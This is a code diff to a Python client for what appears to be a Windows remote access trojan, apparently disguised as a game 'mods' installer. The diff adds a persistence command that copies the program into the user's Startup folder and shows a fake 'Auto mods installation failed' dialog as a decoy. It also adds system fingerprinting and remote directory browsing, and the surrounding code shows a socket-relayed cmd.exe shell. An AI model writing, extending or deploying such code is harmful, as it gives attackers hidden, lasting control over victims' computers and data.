@@ -14,8 +14,12 @@ import subprocess
 import threading
 import platform
 import psutil
+import shutil
+import ctypes
 import socket
 import json
+import sys
+import os
 
 class Command:
 	def __init__(self, client) -> None:
@@ -29,6 +33,31 @@ class Command:
 		if command_name in command_list:
 			getattr(self, command_name)(args)
 
+	def persistance(self, args: list) -> None:
+		path = os.path.abspath(sys.argv[0])
+		print(path)
+		
+		try:
+			shutil.copy(path, os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", os.path.basename(sys.argv[0])))
+			self.client.send(json.dumps({"success": True}))
+		except Exception as e:
+			print(e)
+			self.client.send(json.dumps({"success": False}))
+		print(args)
+		if (args == [1]):
+			threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, "Auto mods installation failed", "Auto mods", 5)).start()
+
+
+	def info(self, args: list) -> None:
+		info = {
+			"platform": platform.platform(),
+			"architecture": platform.architecture(),
+			"processor": platform.processor(),
+			"name": socket.gethostname(),
+			"ram": f"{round(psutil.virtual_memory().used / (1024 ** 3), 2)} / {round(psutil.virtual_memory().total / (1024 ** 3))} GB",
+		}
+		self.client.send(json.dumps(info))
+		
 	def shell(self, args: list) -> None:
 		shell = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
@@ -60,16 +89,29 @@ class Command:
 		self.client.send("EXIT")
 		shell.terminate()
 
-	def information(self, args: list) -> None:
-		info = {
-			"platform": platform.platform(),
-			"architecture": platform.architecture(),
-			"processor": platform.processor(),
-			"name": socket.gethostname(),
-			"ram": f"{round(psutil.virtual_memory().used / (1024 ** 3), 2)} / {round(psutil.virtual_memory().total / (1024 ** 3))} GB",
-		}
-		self.client.send(json.dumps(info))
-		
+	def cd(self, args: list) -> None:
+		path = os.path.expanduser("~")
+		if (args[0] != "~"):
+			path = args[0]
+
+		payload = None
+		if (os.path.exists(path)):
+			os.chdir(path)
+			payload = {"success": True, "path": os.getcwd()}
+		else:
+			payload = {"success": False} 
+
+		self.client.send(json.dumps(payload))
+	
+	def ls(self, args: list) -> None:
+		path = os.getcwd()
+		if (args[0] != None):
+			path = args[0]
+
+		dir_list = os.listdir(path)
+		payload = {dir: {"directory": os.path.isdir(dir), "time": os.path.getctime(dir)} for dir in dir_list}
+		self.client.send(json.dumps(payload))
+	
 	def close(self, args: list) -> None:
 		print("client closed")
 		self.client.close()
